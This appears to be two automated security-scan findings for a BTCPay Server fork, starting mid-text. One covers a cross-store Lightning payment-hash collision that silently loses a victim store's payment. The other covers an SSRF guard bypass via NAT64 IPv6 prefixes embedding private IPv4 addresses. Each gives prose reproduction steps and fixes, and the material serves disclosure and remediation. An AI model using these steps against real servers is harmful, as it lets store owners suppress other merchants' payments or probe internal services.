Because the key has no store or invoice component, a store owner whose node returns a payment hash H that already belongs to a pending invoice of another store V, and reports its own invoice Paid, inserts `Payments(H, 'BTC-LN')` for their own invoice first (preimage is optional; `GetValidPreimage` only logs a mismatch). When V's customer later pays V's real invoice H, V's listener's insert collides on the primary key, is treated as idempotent, and V's node invoice is dropped: the funds land on V's node but V's BTCPay invoice never records the payment, no PaymentSettled/ReceivedPayment events or webhooks fire, and the invoice expires unpaid. Nothing alerts V's operator.

The `AddressInvoices` PK (Address, PaymentMethodId) would make a direct `CreateInvoiceAsync` with an already-tracked hash fail (InvoiceRepository.cs:260-268 uses EF AddAsync + SaveChanges), but every later prompt (re)issue path goes through `UpsertAddressInvoice` with `ON CONFLICT DO NOTHING` (InvoiceRepository.cs:86-90): lazy payment-method activation (`InvoiceActivator` -> `NewPaymentPrompt`, InvoiceActivator.cs:57-62; `LazyPaymentMethods` is a store/per-invoice setting the attacker controls on their own store), partial-payment re-issue (`CreateNewLNInvoiceForBTCPayInvoice` -> `NewPaymentPrompt`), and the LNURL-pay callback (`UpdatePrompt`, UILNURLController.cs:850-868, giving the same primitive for `BTC-LNURL`). So the attacker's invoice can carry H, is tracked by the listener (`InvoicePaymentMethodActivated` / `InvoiceNewPaymentDetailsEvent` -> `_CheckInvoices` -> immediate `PollPayment`), and their backend's Paid answer is recorded.

Root cause: an identifier supplied by an untrusted remote node is used as a server-wide unique key, and a key conflict is interpreted as idempotent duplication rather than as a cross-invoice collision.

Assumption: BTCPayServer.Lightning.All 1.7.13 clients pass the backend's `payment_hash`/BOLT11 through unchanged.

## Evidence
1. [BTCPayServer/Payments/Lightning/LightningListener.cs:595–652](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningListener.cs#L595-L652)
   AddPaymentCore builds the PaymentData row with Id = the payment hash taken from the node notification (notification.GetPaymentHash) and treats a null return from PaymentService.AddPayment as RecordedState.AlreadyRecorded, assuming an insert failure can only mean this same payment was already stored.
2. [BTCPayServer/Payments/Lightning/LightningListener.cs:587–593](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningListener.cs#L587-L593)
   AddPayment removes the node invoice from _ListenedInvoices for every state except RetryLater, so once AlreadyRecorded is returned the victim's node invoice is never polled or listened to again; a restart re-polls, gets Paid again, and hits the same conflict.
3. [BTCPayServer/Services/Invoices/PaymentService.cs:50–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/PaymentService.cs#L50-L64)
   Any DbUpdateException on inserting the payment row is swallowed and reported as 'already exists' (return null). There is no check that the pre-existing row with the same key belongs to the same invoice, store or node.
4. [BTCPayServer.Data/Data/PaymentData.cs:33–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/PaymentData.cs#L33-L36)
   The Payments table primary key is (Id, PaymentMethodId) with no store or invoice component, so the key space for Lightning payments (Id = payment hash, PaymentMethodId = 'BTC-LN' or 'BTC-LNURL') is shared by every store on the server.
5. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:132–141](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L132-L141)
   The payment hash of a store's Lightning prompt is whatever the store's configured node returns from CreateInvoice (lightningInvoice.GetPaymentHash). A store owner who controls their node therefore chooses the payment hash BTCPay later uses as the payment Id.
6. [BTCPayServer/Services/Invoices/InvoiceRepository.cs:84–90](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceRepository.cs#L84-L90)
   UpsertAddressInvoice inserts the tracked payment hash with ON CONFLICT DO NOTHING. Used by NewPaymentPrompt (lazy activation, partial-payment re-issue) and UpdatePrompt (LNURL callback), it lets the attacker's invoice adopt a hash already tracked by another store's invoice, whereas CreateInvoiceAsync (lines 260-268) would fail on the AddressInvoices primary key.
7. [BTCPayServer/Services/InvoiceActivator.cs:57–61](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/InvoiceActivator.cs#L57-L61)
   Lazy activation of the attacker's own invoice: CreatePaymentPrompt obtains the node-chosen hash, NewPaymentPrompt persists it via the ON CONFLICT DO NOTHING upsert, and InvoicePaymentMethodActivated makes the listener track and immediately poll the invoice, so the attacker's backend's Paid answer inserts Payments(H, 'BTC-LN') ahead of the victim.
8. [BTCPayServer/Controllers/UILNURLController.cs:850–868](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L850-L868)
   LNURL-pay callback variant: the BOLT11, PaymentHash and node invoice id returned by the store's node are stored via UpdatePrompt (same upsert), giving the identical collision primitive for the 'BTC-LNURL' payment method.
9. [BTCPayServer/Payments/Lightning/LightningExtensions.cs:34–38](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningExtensions.cs#L34-L38)
   GetPaymentHash parses the node-supplied PaymentHash string or BOLT11 without any cross-check against anything BTCPay generated.

## Impact
Cross-store integrity: a real settled Lightning payment to the victim store is never recorded; the invoice stays unpaid, no PaymentSettled/webhook events fire, and the loss is permanent (restart re-collides). The attacker picks which observed pending invoice is affected but cannot forge payments, alter amounts or touch other data, so the modification is targeted and limited (VI:L). No confidentiality impact; the service itself stays available.

## Reproduction steps
1. Attacker: authenticated user owning a store (PR:L) who points it at a 'safe' public HTTPS Lightning backend they run (allowed without admin, LightningLikePaymentHandler.cs:275-287). They must observe a pending victim invoice's BOLT11 before the customer pays (anonymous /i/{id} checkout page; public payment-request pages list invoice ids) - a runtime-state race (AT:P). Then: create an invoice on their store with lazy payment methods (or via LNURL), activate it so their backend returns hash H, have it report Paid; the listener polls immediately and inserts Payments(H,'BTC-LN'). Plain HTTPS; no victim interaction.

## Recommended fix
1. Lightning payment rows are keyed server-wide by (payment hash, payment method), an identifier supplied by a store-controlled node, so two stores' invoices can collide and the second insert is silently lost. Fix criteria: A Lightning payment for invoice X must be recorded even when another invoice (in any store) already holds a payment with the same payment hash and payment method, e.g. by including the invoice (or store/node) in the payment identity. Verify by creating two invoices in two stores whose nodes return the same payment hash, settling both, and confirming both invoices record their payment.
2. PaymentService.AddPayment and LightningInstanceListener.AddPayment treat any insert failure as 'already recorded for this invoice' and permanently stop tracking the node invoice. Fix criteria: On a key conflict, the code must check whether the existing row belongs to the same invoice; if it does not, the payment must still be recorded (or the invoice flagged with an error log/notification and kept under monitoring) rather than dropped. Verify that a conflicting row from a different invoice does not cause the listener to remove the node invoice from its listened set.
3. UpsertAddressInvoice (NewPaymentPrompt / UpdatePrompt) silently ignores a payment hash already tracked by a different invoice, so a store's node can issue a prompt reusing another store's payment hash. Fix criteria: Prompt (re)issuance must detect that the node-returned payment hash is already tracked by a different invoice and refuse or re-request the invoice (logging the event), consistently with CreateInvoiceAsync. Verify that activating a lazy prompt whose node returns an already-tracked hash does not yield a tracked prompt with that hash.

---
**Severity:** LOW
**Status:** Open
**Category:** Duplicate identifier collision
**CWE:** [CWE-694](https://cwe.mitre.org/data/definitions/694.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257278

---

# SSRF guard classifies NAT64 translation prefixes embedding private IPv4 as public

## Details
The server-wide SSRF guard (SSRFProtectionExtensions.Connect → Extensions.IsLocalNetwork → IsPublicAddress) correctly pins the connection to the resolved address and correctly unwraps IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) before applying the IPv4 private-range rules, but for all other IPv6 addresses it applies a fixed denylist that omits the IPv4/IPv6 translation prefixes: the NAT64 well-known prefix 64:ff9b::/96 (RFC 6052) and the local-use NAT64 prefix 64:ff9b:1::/48 (RFC 8215). An address such as 64:ff9b::a00:1 (10.0.0.1), 64:ff9b::ac11:2 (172.17.0.2, the Docker bridge range used by the official deployment's NBXplorer/Postgres containers) or 64:ff9b:1::c0a8:1 (192.168.0.1) is classified as public, and the embedded IPv4 address is never tested against the IPv4 rules that would have rejected it.

A hostile store owner controls the webhook hostname and its DNS. Publishing an AAAA record of that form makes Connect resolve it, judge it public and open a TCP socket to it. On a host whose IPv6 egress passes through a NAT64 translator that honours the prefix for private IPv4 targets — the explicit purpose of the RFC 8215 local-use prefix, and the advertised behaviour of cloud NAT64 gateways on IPv6-only subnets that reach IPv4 services inside the same private network — the connection is translated to the embedded private IPv4 host. The guard's documented contract (docs/operators/README.md: 'connect only to public network addresses', preventing access to 'services that are reachable from the server but not from the public internet') is thereby defeated for that environment.

The other IPv6 transition forms (6to4 2002::/16, Teredo 2001::/32, deprecated IPv4-compatible ::/96) are likewise not denied, but they encapsulate IPv6 toward a tunnel endpoint rather than delivering TCP to an IPv4 service, so no HTTP reach to an internal service was established through them; denying them is hygiene, not the exploitable defect.

Assumptions: .NET 10 IPAddress.IsIPv4MappedToIPv6 is true only for ::ffff:0:0/96 and Dns.GetHostAddressesAsync(AddressFamily.Unspecified) returns AAAA records (framework behaviour not verifiable in this checkout). RFC 6052 §3.1 requires compliant translators to drop well-known-prefix packets embedding non-global IPv4, so exploitation via 64:ff9b::/96 relies on a translator that does not enforce this, while 64:ff9b:1::/48 is designed for exactly that mapping.

This finding is conditional on the deployment network: it requires IPv6 connectivity from the BTCPay process through a NAT64 translator that reaches the private IPv4 network. In IPv4-only or plain dual-stack deployments (including the default Docker bridge without IPv6) the address is unroutable and the attack fails. The repository does not settle the network environment, so the finding is filed with that condition stated.

## Evidence
1. [BTCPayServer/Extensions.cs:720–736](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions.cs#L720-L736)
   IsPublicAddress is the sole address classifier behind IsLocalNetwork and therefore behind every SSRF-protected HttpClient. It unwraps only the IPv4-mapped form (IsIPv4MappedToIPv6, ::ffff:0:0/96) before applying the IPv4 private-range rules; every other IPv6 address is judged by a fixed denylist (::, ::1, fe80::/10, fec0::/10, ff00::/8, 2001:2::/48, 2001:db8::/32, 3fff::/20, fc00::/7). The NAT64 well-known prefix 64:ff9b::/96 (RFC 6052) and the local-use translation prefix 64:ff9b:1::/48 (RFC 8215) match none of these (bytes[0]=0x00, bytes[1]=0x64), so 64:ff9b::a00:1 (embedding 10.0.0.1) or 64:ff9b::ac11:2 (172.17.0.2) returns true (public). The embedded IPv4 is never checked. The project's own tests (BTCPayServer.Tests/NetworkExtensionsTests.cs) contain no case for these prefixes, so this is an omission rather than a documented design choice.
2. [BTCPayServer/SSRFProtectionExtensions.cs:39–61](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/SSRFProtectionExtensions.cs#L39-L61)
   Connect resolves the hostname with AddressFamily.Unspecified (AAAA records included), calls Extensions.IsLocalNetwork(address.ToString()) on each result, skips only addresses judged local, and opens a TCP socket directly to any address judged public. An AAAA record of 64:ff9b::<private IPv4> passes and is connected to; whether the packet reaches the embedded IPv4 host then depends on a NAT64 translator on the server's IPv6 egress path.
3. [BTCPayServer/Plugins/Webhooks/WebhookSender.cs:150–186](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhookSender.cs#L150-L186)
   The webhook URL comes from the store-controlled WebhookBlob and non-.onion URLs go through the clearnet client whose only protection is UseSSRFProtection (WebhooksPlugin.cs:41-42). The delivery is a JSON POST; the resulting HTTP status code or the connection exception message is persisted on the delivery blob (lines 170-186), giving the attacker a connectivity/port oracle.
4. [BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs:66–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs#L66-L70)
   Webhook creation/update validates the URL only with Uri.TryCreate(..., UriKind.Absolute); no host, scheme or address-class restriction is applied at creation, so the whole burden rests on the connect-time classifier.
5. [BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs:170–182](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs#L170-L182)
   The delivery's Status, ErrorMessage and HttpCode are returned to the store owner through the Greenfield deliveries endpoints (the UI likewise shows LastDeliveryErrorMessage in UIStoreWebhooksController.cs:49), which is how the attacker reads the result of each probe.

## Impact
From the server's network position the attacker sends a JSON POST (server-generated event body, attacker-chosen HMAC header) to private IPv4 HTTP services and learns the status code or connection error per probe: service and port discovery without reading response bodies (limited confidentiality). Unauthenticated internal HTTP endpoints that act on a POST (the official deployment runs NBXplorer with authentication disabled on the Docker network) can have state changed, but the body shape is constrained (limited integrity). No availability impact.

## Reproduction steps
1. A store owner, manager or CanModifyWebhooks API key registers a webhook for a hostname they control (only Uri.TryCreate is checked) and publishes an AAAA record 64:ff9b::<private IPv4>. Any invoice event triggers delivery; Connect resolves the name, IsPublicAddress misclassifies the address as public and the socket is opened. The attacker reads HttpCode/ErrorMessage from the Greenfield deliveries endpoint or UI and iterates addresses/ports. Exploitation needs a NAT64 translator on the server's IPv6 path that maps the prefix to private IPv4 — a deployment condition outside the attacker's control, hence AT:PRESENT. No defence beyond the misclassifying guard stands in the way (AC:LOW).

## Recommended fix
IsPublicAddress judges IPv6 addresses by a fixed denylist and unwraps only the ::ffff:0:0/96 mapped form, so IPv6 translation prefixes that embed an IPv4 address (64:ff9b::/96, 64:ff9b:1::/48) escape the IPv4 private-range rules and the SSRF guard connects to them. Fix criteria: Every IPv6 address that embeds an IPv4 address must either be treated as non-public or have its embedded IPv4 extracted and evaluated under the IPv4 rules; this must cover 64:ff9b::/96 and 64:ff9b:1::/48 and should also deny 2002::/16, 2001::/32 (Teredo) and ::/96 as hygiene. Verify with NetworkExtensionsTests cases that IsLocalNetwork returns true for 64:ff9b::a00:1, 64:ff9b:1::c0a8:1, 2002:a00:1:: and ::10.0.0.1, that SSRFProtectionExtensions.Connect fails a hostname resolving to such an address with 'does not resolve to an allowed network address', and that genuine global unicast addresses still connect.

---
**Severity:** LOW
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257276